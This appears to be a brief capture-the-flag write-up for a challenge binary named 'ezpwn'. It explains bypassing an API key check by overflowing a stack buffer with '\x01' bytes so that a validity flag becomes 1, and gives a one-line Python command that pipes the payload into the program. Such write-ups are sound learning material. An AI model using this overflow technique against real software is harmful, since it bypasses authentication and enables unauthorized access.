## writeup - ezpwn

enter a bunch of '\x01' overflow the buffer set the valid check to 1.


Can be done intelligently with GDB or through guess and check.

* How is the API key being checked?
* Is it being checked?
* Where on the stack is the validity checker?

```
python -c 'print("\x01"*25)' | ./ezpwn
```

